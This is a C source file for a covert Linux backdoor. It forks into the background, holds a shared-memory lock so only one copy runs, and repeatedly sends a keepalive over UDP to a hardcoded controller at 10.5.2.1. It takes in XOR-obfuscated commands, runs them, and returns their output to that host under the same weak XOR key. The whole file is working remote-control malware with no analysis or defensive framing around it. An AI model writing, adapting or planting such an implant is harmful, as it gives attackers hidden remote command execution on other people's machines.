#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <string.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <sys/select.h>
#include <fcntl.h>
#include <arpa/inet.h> 
#include <netinet/in.h> 
#include <linux/limits.h>
  
#define BUFSIZE 1024

const char key[] = "blarknob";
char keepalive[] = "<<CRLCHK>>";

void crypt(char *m) {
    uint32_t len = strlen(m);
	for (uint32_t i = 0; i < len; i++) {
		m[i] ^= key[i % strlen(key)];
	}
}

int exec(char *cmd, int sockfd, struct sockaddr_in *servaddr) {
    int fds[2];
    char buffer[PATH_MAX + 1];
    fd_set readfds, w_readfds;

    if (pipe(fds) == -1)
        return 0;
    pid_t pid = fork();
    if (pid == 0) {
        close(fds[0]);
        dup2(fds[1], STDOUT_FILENO);
        dup2(fds[1], STDERR_FILENO);
        char *args = strchr(cmd, ' ');
        if (args != NULL) {
            *args = '\0';
            args++;
        }
        execlp(cmd, cmd, args, NULL);
        exit(0);
    }
    close(fds[1]);

    uint32_t sec = time(NULL);
    ssize_t len = 0;
    FD_ZERO(&readfds);
    FD_SET(fds[0], &readfds);
    int rv = 0;

    while (time(NULL) - sec < 5) {
        memcpy(&w_readfds, &readfds, sizeof(readfds));
        rv = select(fds[0] + 1, &w_readfds, NULL, NULL, NULL);
        if (rv > 0) {
            len = read(fds[0], buffer, sizeof(buffer));
            if (len == -1) {
                if (errno == EINTR) {
                    continue;
                } else {
                    return 0;
                }
            } else if (len == 0) {
                break;
            } else {
                crypt(buffer);
                sendto(sockfd, buffer, len, 0, (const struct sockaddr *) servaddr, sizeof(struct sockaddr_in));
            }
        }
    }
    close(fds[0]);
    kill(pid, SIGKILL);
    return 1;
}
  
int main() { 
    pid_t pid = fork();
    if (pid < 0) {
        exit(0);
    }
    else if (pid > 0) {
        exit(0);
    } 
    else {
        int flags, serverlen, n, ready, sockfd, rtn, rv;
        char cmd[PATH_MAX + 1];
        struct sockaddr_in servaddr;
        fd_set readfds, w_readfds;
        struct timeval tv;
        pthread_mutex_t *mutex;
        signal(SIGCHLD, SIG_IGN); //reap my kids
        int mode = S_IRWXU | S_IRWXG;
        int fd = shm_open("/blarknob", O_CREAT | O_RDWR | O_EXCL, mode);

        if (fd < 0) {
            fd = shm_open("/blarknob", O_RDWR, mode);
            mutex = (pthread_mutex_t *)mmap(0, sizeof(pthread_mutex_t), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        } else {
            ftruncate(fd, sizeof(pthread_mutex_t));
            mutex = (pthread_mutex_t *)mmap(0, sizeof(pthread_mutex_t), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
            pthread_mutexattr_t attr;
            pthread_mutexattr_init(&attr);
            pthread_mutexattr_setrobust(&attr, PTHREAD_MUTEX_ROBUST);
            pthread_mutexattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
            pthread_mutex_init(mutex, &attr);
            pthread_mutexattr_destroy(&attr);
        }
        rtn = pthread_mutex_lock(mutex);

        crypt(keepalive);
        srand(time(NULL));
        size_t rekey = 0;
        
        while (1) {
            if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
                sleep(5);
                continue;
            }

            memset(&servaddr, 0, sizeof(servaddr));
            servaddr.sin_family = AF_INET;
            servaddr.sin_port = htons(58800 + (rand() % 250));
            servaddr.sin_port = htons(58892);
            inet_aton("10.5.2.1", &servaddr.sin_addr);

            serverlen = sizeof(servaddr);

            int flags = fcntl(sockfd, F_GETFL);
            flags |= O_NONBLOCK;
            fcntl(sockfd, F_SETFL, flags);

            FD_ZERO(&readfds);
            FD_SET(sockfd, &readfds);

            tv.tv_sec = 0;
            tv.tv_usec = 10;

            ready = 1;
            uint32_t keepalive_timer = 0;
            while (ready) {
                memcpy(&w_readfds, &readfds, sizeof(readfds));
                rv = select(sockfd + 1, &w_readfds, NULL, NULL, &tv);
                if (rv > 0) {
                    keepalive_timer = time(NULL);
                    n = recvfrom(sockfd, cmd, PATH_MAX, 0, (struct sockaddr *) &servaddr, &serverlen);
                    cmd[n] = '\0';
                    crypt(cmd);
                    exec(cmd, sockfd, &servaddr);
                }
                if (time(NULL) - keepalive_timer > 5) {
                    keepalive_timer = time(NULL);
                    if (rekey > 2) {
                        close(sockfd);
                        ready = 0;
                        rekey = 0;
                        continue;
                    }
                    sendto(sockfd, keepalive, strlen(keepalive), 0, (const struct sockaddr *) &servaddr, sizeof(servaddr));
                    rekey++;
                }
                sleep(1);
            }
        }
        return 0;
    }
}
